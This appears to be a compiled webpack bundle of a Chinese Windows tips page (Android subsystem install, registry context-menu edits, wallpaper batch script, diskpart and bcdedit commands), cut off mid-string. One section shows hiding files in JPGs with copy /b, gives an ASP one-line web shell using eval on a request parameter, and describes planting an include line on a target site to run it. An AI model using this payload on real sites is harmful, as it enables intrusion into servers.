(window.webpackJsonp=window.webpackJsonp||[]).push([[16],{360:function(s,t,a){"use strict";a.r(t);var e=a(0),n=Object(e.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("details",{staticClass:"custom-block details"},[t("summary",[s._v("Windows安卓子系统")]),s._v(" "),t("p",[s._v("打开微软商店的工具网站")]),s._v(" "),t("p",[t("a",{attrs:{href:"https://store.rg-adguard.net/",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://store.rg-adguard.net/"),t("OutboundLink")],1)]),s._v(" "),t("p",[s._v("然后在搜索框输入")]),s._v(" "),t("p",[t("a",{attrs:{href:"https://www.microsoft.com/store/productid/9p3395vx91nr",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://www.microsoft.com/store/productid/9p3395vx91nr"),t("OutboundLink")],1)]),s._v(" "),t("p",[s._v("通道选择slow即可")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Superdeeep/photo/Androidsubsystemfetch.png",alt:""}})]),s._v(" "),t("p",[s._v("找到最下面的最大的msixbundle文件")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Superdeeep/photo/AndroidSubsystemgetooo.png",alt:""}})]),s._v(" "),t("p",[s._v("下载之后，在文件所在目录打开powershell")]),s._v(" "),t("div",{staticClass:"language-powershell extra-class"},[t("pre",{pre:!0,attrs:{class:"language-powershell"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("Add-AppxPackage")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"MicrosoftCorporationII.WindowsSubsystemForAndroid_2208.40000.5.0_neutral_~_8wekyb3d8bbwe.Msixbundle"')]),s._v("\n")])])]),t("p",[s._v("名字不固定，需要看着更改")]),s._v(" "),t("p",[s._v("进入设置 → 应用 → 可选功能 → 更多 Windows 功能，找到并勾选开启「虚拟机平台」两个选项，完成后会提示重启系统。（Hyper-V并不是必须的）")]),s._v(" "),t("p",[s._v("如果不能启动安卓子系统可以试着在BIOS设置中找到Intel虚拟化相关选项，试着打开一下")]),s._v(" "),t("p",[s._v("如果改崩了开不了机就恢复BIOS默认设置继续改（不要怂就是干😎）")]),s._v(" "),t("p",[s._v("附上一个安卓子系统助手，晨种酱开发的捏~(￣▽￣)~")]),s._v(" "),t("p",[t("a",{attrs:{href:"https://ondrive.vercel.app/api/raw/?path=/AndroidSubTool/%E5%AD%90%E7%B3%BB%E7%BB%9F%E5%8A%A9%E6%89%8B_V1.0.zip",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://ondrive.vercel.app/api/raw/?path=/AndroidSubTool/%E5%AD%90%E7%B3%BB%E7%BB%9F%E5%8A%A9%E6%89%8B_V1.0.zip"),t("OutboundLink")],1)])]),s._v(" "),t("details",{staticClass:"custom-block details"},[t("summary",[s._v("图片藏exe")]),s._v(" "),t("p",[s._v("同理也可以藏木马")]),s._v(" "),t("p",[s._v("以藏PVW32Con.exe（识别图片分辨率等信息的软件）为例")]),s._v(" "),t("p",[s._v("准备好PVW32Con.ico")]),s._v(" "),t("p",[s._v("把PVW32Con.exe压缩，得到PVW32Con.zip")]),s._v(" "),t("p",[s._v("之后使用cmd输入：")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v(" copy PVW32Con.ico/b+PVW32Con.zip/b PVW32Con.jpg\n")])])]),t("p",[s._v("之后便可以得到PVW32Con.jpg，用压缩软件打开图片即可看到PVW32Con.exe，同时图片可以正常浏览。")]),s._v(" "),t("p",[s._v("一句话木马为：")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("copy "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(".jpg/b+1.asp/a "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(".jpg\n")])])]),t("p",[s._v("/b   意思是二进制文件")]),s._v(" "),t("p",[s._v("/a   意思是ASCII码文件")]),s._v(" "),t("p",[s._v("asp文件内容 "),t("code",[s._v('<%eval request("value")%>')])]),s._v(" "),t("p",[s._v("把"),t("code",[s._v("<% #include files=”2.jpg”%>")]),s._v("放入目标网站，即可执行asp")])]),s._v(" "),t("details",{staticClass:"custom-block details"},[t("summary",[s._v("Windows聚焦图片文件位置")]),s._v(" "),t("p",[s._v("C:\\Users\\你的用户名\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\Assets")])]),s._v(" "),t("details",{staticClass:"custom-block details"},[t("summary",[s._v("去除开始菜单的chrome背景色")]),s._v(" "),t("p",[s._v("找到chrome的位置")]),s._v(" "),t("p",[s._v("删除chrome.VisualElementsManifest.xml即可")])]),s._v(" "),t("details",{staticClass:"custom-block details"},[t("summary",[s._v("全面控制面板（上帝模式）")]),s._v(" "),t("p",[s._v("新建文件夹")]),s._v(" "),t("p",[s._v("重命名为\n.{ED7BA470-8E54-465E-825C-99712043E01C}")])]),s._v(" "),t("details",{staticClass:"custom-block details"},[t("summary",[s._v("为右键菜单增加Terminal等")]),s._v(" "),t("p",[s._v("1、删除Windows Terminal自带右键菜单")]),s._v(" "),t("p",[s._v("删除：")]),s._v(" "),t("div",{staticClass:"language-r extra-class"},[t("pre",{pre:!0,attrs:{class:"language-r"}},[t("code",[t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions\\Blocked"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"{9F156763-7844-4DC4-B2B1-901F640F5155}"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"WindowsTerminal"')]),s._v("\n")])])]),t("p",[s._v("添加：")]),s._v(" "),t("div",{staticClass:"language-r extra-class"},[t("pre",{pre:!0,attrs:{class:"language-r"}},[t("code",[t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions\\Blocked"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"{9F156763-7844-4DC4-B2B1-901F640F5155}"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("\n")])])]),t("p",[s._v("原理添加类似于添加黑名单")]),s._v(" "),t("p",[s._v("2、添加自己的Windows Terminal")]),s._v(" "),t("p",[s._v("图标在此：https://cdn.jsdelivr.net/gh/Superdeeep/photo/ico.zip")]),s._v(" "),t("div",{staticClass:"language-r extra-class"},[t("pre",{pre:!0,attrs:{class:"language-r"}},[t("code",[t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Directory\\background\\shell\\Terminal"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Icon"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"C:\\\\Program Files\\\\wt.ico"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("图标文件存储位置"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("下同\n"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("@")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Open in Terminal"')]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Directory\\background\\shell\\Terminal\\command"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("@")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"C:\\\\Users\\\\你的用户名\\\\AppData\\\\Local\\\\Microsoft\\\\WindowsApps\\\\wt.exe -p \\"Command Prompt\\" -d ."')]),s._v("\n")])])]),t("p",[s._v("其他")]),s._v(" "),t("p",[s._v("添加shift+右键管理员打开cmd以及普通的powershell")]),s._v(" "),t("div",{staticClass:"language-r extra-class"},[t("pre",{pre:!0,attrs:{class:"language-r"}},[t("code",[s._v("\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Directory\\background\\shell\\cmd"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("@")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"@shell32.dll,-8506"')]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Extended"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('""')]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"NoWorkingDirectory"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('""')]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"CommandFlags"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("dword"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("00000008")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Directory\\background\\shell\\cmd\\command"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("@")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"cmd.exe /s /k pushd \\"%V\\""')]),s._v("\n\n\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Directory\\background\\shell\\Powershell"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("@")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"@shell32.dll,-8508"')]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Extended"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('""')]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"NoWorkingDirectory"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('""')]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"ShowBasedOnVelocityId"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("dword"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("00639")]),s._v("bc8\n"),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Icon"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"C:\\\\Program Files\\\\powershell.ico"')]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Directory\\background\\shell\\Powershell\\command"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("@")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("\"powershell.exe -noexit -command Set-Location -literalPath '%V'\"")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Directory\\background\\shell\\runas"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("@")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('""')]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Extended"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("dword"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("00000000")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Icon"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"C:\\\\Program Files\\\\cmd.ico"')]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Directory\\background\\shell\\runas\\command"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"ShowBasedOnVelocityId"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("dword"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("00639")]),s._v("bc8\n"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("@")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"cmd.exe /s /k pushd \\"%V\\""')]),s._v("\n\n")])])])]),s._v(" "),t("details",{staticClass:"custom-block details"},[t("summary",[s._v("批量筛选图片")]),s._v(" "),t("p",[s._v("需要用到pvw32con.exe")]),s._v(" "),t("p",[s._v("请下载如下的图片，请不要直接拖出来，是下载该图片")]),s._v(" "),t("p",[s._v("请确保文件名为 PVW32Con.exe.jpg")]),s._v(" "),t("p",[t("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Superdeeep/photo/PVW32Con.exe.jpg",alt:""}})]),s._v(" "),t("p",[s._v("下载完成后，不要修改后缀名（修改成压缩包后缀名是无法打开的），直接用压缩软件打开，即可看到pvw32con.exe，之后你可以把它解压出来。")]),s._v(" "),t("p",[s._v("以下为复制Windows聚焦图片并筛选出1920X1080的图片，并把筛选出的图片放到桌面的脚本")]),s._v(" "),t("p",[s._v("请把脚本和PVW32Con.exe放在同一目录下后再运行脚本")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("@color 0a\nmd C:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Users"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("%username%"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("desktop"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("wallpaper\nmd C:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("temp"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("wallpaper"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\ncopy "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"C:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\Assets"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"C:'),t("span",{pre:!0,attrs:{class:"token entity",title:"\\t"}},[s._v("\\t")]),s._v("emp\\wallpaper"),t("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[s._v('\\"')]),s._v('\ncd "')]),s._v("C:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("temp"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("wallpaper"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v('"\nren *.? *.jpg\n'),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"mulu=C:'),t("span",{pre:!0,attrs:{class:"token entity",title:"\\t"}},[s._v("\\t")]),s._v("emp\\wallpaper"),t("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[s._v('\\"')]),s._v('\nset "')]),s._v("www"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1920")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"\n\nset "')]),s._v("path"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("%path%"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("%~dp0"),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"\npushd "')]),s._v("%mulu%"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v('"\n\n'),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"%temp%\\.p"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"%cd%"')]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("dir")]),s._v(" /a:d /s /b\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" /f "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"usebackq delims="')]),s._v(" %%P "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"%temp%\\.p"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("do")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" exist "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"%%~P\\*.jpg"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"%temp%\\.p"')]),s._v(" pvw32con "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"%%~P\\*.jpg"')]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" /f "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"usebackq tokens=1,2 delims=:"')]),s._v(" %%i "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"%temp%\\.p"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("do")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("\n            "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("file")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"%%~P\\%%i"')]),s._v("\n            "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("width")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("%%j\n            "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" /a width "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" width\n            SetLocal EnableDelayedExpansion\n            "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("width"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v(" lss %www% del /a /f "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("file"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("\n            EndLocal\n        "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\ndel "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"%temp%\\.p"')]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("popd")]),s._v("\n\ncopy "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"C:'),t("span",{pre:!0,attrs:{class:"token entity",title:"\\t"}},[s._v("\\t")]),s._v("emp\\wallpaper"),t("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[s._v('\\"')]),s._v(' "')]),s._v("C:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Users"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("%username%"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("desktop"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("wallpaper"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v('"\n'),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(' "C:'),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("temp"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v('"\ndel wallpaper /q\npause\n')])])])]),s._v(" "),t("details",{staticClass:"custom-block details"},[t("summary",[s._v("Winload隐藏磁盘")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("md F:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("RECYCLED"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("UDrives."),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("25336920")]),s._v("-03F9-11CF-8FD0-00AA00686F13"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("NUL\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" exist M:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("NUL goto delete\nsubst M: F:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("RECYCLED"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("UDrives."),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("25336920")]),s._v("-03F9-11CF-8FD0-00AA00686F13"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\nstart M:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\ngoto end\n:delete\nsubst /D M:\n")])])])]),s._v(" "),t("details",{staticClass:"custom-block details"},[t("summary",[s._v("Winload错误")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("rem 先输入：\nbcdedit /set "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("default"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v(" osdevice boot 回车；\nrem 再输入：\nbcdedit /set "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("default"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v(" device boot 回车；\nrem 最后输入：\nbcdedit /set "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("default"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v(" detecthal "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("  回车；\n")])])])]),s._v(" "),t("details",{staticClass:"custom-block details"},[t("summary",[s._v("批量重命名")]),s._v(" "),t("p",[s._v("以图片为例")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("ren *? *.jpg\n")])])])]),s._v(" "),t("details",{staticClass:"custom-block details"},[t("summary",[s._v("打开我的电脑")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("C:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("WINDOWS"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("EXPLORER.EXE /n, /e, ::"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("20D04FE0-3AEA-1069-A2D8-08002B30309D"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])])])]),s._v(" "),t("details",{staticClass:"custom-block details"},[t("summary",[s._v("Diskpart命令")]),s._v(" "),t("p",[s._v("Diskpart命令\n"),t("strong",[s._v("!!!此命令会清除硬盘内所有数据!!!")])]),s._v(" "),t("ul",[t("li",[s._v("Diskpart常用命令如下\n"),t("ul",[t("li",[t("p",[s._v("转换为GPT/mbr分区")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("diskpart\nlist disk\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("select")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("disk")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("\nconvert gpt\nconvert mbr\n")])])])]),s._v(" "),t("li",[t("p",[s._v("安装系统时磁盘分区")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("diskpart\nclean   rem 清除物理磁盘所有信息\ncreate partition primary "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("size")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("102400")]),s._v("   rem 100GB的大小\nactive   rem 激活主分区\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("format")]),s._v(" quick    rem 快速格式化主分区\n")])])])]),s._v(" "),t("li",[t("p",[s._v("创建其他的分区")]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[s._v("create partition primary "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("size")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("102400")]),s._v("    rem 创建100GB主分区\ncreate partition extended    rem 创建扩扩展分区\ncreate partition logical "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("size")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("102400")]),s._v("    rem 创建100G逻辑分区\ncreate partition logic    rem 将剩余扩展分区全部作为逻辑分区\ndelete partition     rem 删除分区\n")])])])])])])])]),s._v(" "),t("details",{staticClass:"custom-block 